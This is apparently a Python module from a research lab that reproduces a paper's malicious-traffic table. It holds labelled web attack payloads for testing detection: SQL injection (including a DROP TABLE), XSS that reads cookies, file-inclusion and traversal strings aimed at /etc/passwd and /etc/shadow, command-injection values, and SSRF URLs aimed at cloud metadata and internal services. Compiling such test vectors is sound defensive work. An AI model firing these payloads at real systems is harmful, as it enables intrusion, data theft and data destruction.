"""
Labeled attack payload sets mirroring Table II of the paper
(Malicious Traffic Composition and Generation Methods).

Each entry is (method, path, params_or_body, category). Payloads are drawn
from well-known public test-vector collections (OWASP CRS regression tests,
PortSwigger's XSS/SQLi cheat sheets, PayloadsAllTheThings) so the set is
reproducible without depending on a specific external scanner. Where the
paper's methodology used a dedicated tool (SQLMap, XSStrike, Commix, Burp
Intruder, Dotdotpwn) this module provides an equivalent curated payload set
so the lab runs without requiring every tool to be installed; drivers for
the original tools are in run_with_external_tools.sh for anyone who has
them available.
"""

SQLI = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT username, password FROM users--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "' OR 'a'='a",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "%27%20OR%20%271%27%3D%271",  # double-encoded OR 1=1
    "' OR 1=1#",
    "1' ORDER BY 10--",
    "' HAVING 1=1--",
    "' OR EXISTS(SELECT * FROM users)--",
]

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('xss')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<input onfocus=alert(1) autofocus>",
    '{"__proto__":{"a":"<script>alert(1)</script>"}}',  # JSON param pollution style
]

LFI = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "..\\..\\..\\..\\windows\\win.ini",
]

RCE = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(id)",
    "; ping -c 3 127.0.0.1;",
    "|| id",
]

SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:22",
    "http://127.0.0.1:6379",
    "http://[::1]:80/",
    "gopher://127.0.0.1:6379/_INFO",
]

PATH_TRAVERSAL = [
    "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "....\\....\\....\\boot.ini",
]

# Zero-day-style variants (not literal CRS signature strings) used to
# reproduce Section III-D's 42 manually crafted zero-day probes.
ZERO_DAY = [
    ("SSRF via IPv6 loopback", "http://[0:0:0:0:0:ffff:127.0.0.1]/admin"),
    ("JSON parameter pollution XSS", '{"a":{"a":"<script>alert(1)</script>"}}'),
    ("Unicode-normalization SQLi", "＇ OR 1=1--"),  # fullwidth quote
    ("HTTP/2-style header smuggling probe", "GET / HTTP/1.1\r\nX-Forwarded-Host: evil"),
]

CATEGORIES = {
    "sqli": SQLI,
    "xss": XSS,
    "lfi": LFI,
    "rce": RCE,
    "ssrf": SSRF,
    "path_traversal": PATH_TRAVERSAL,
}
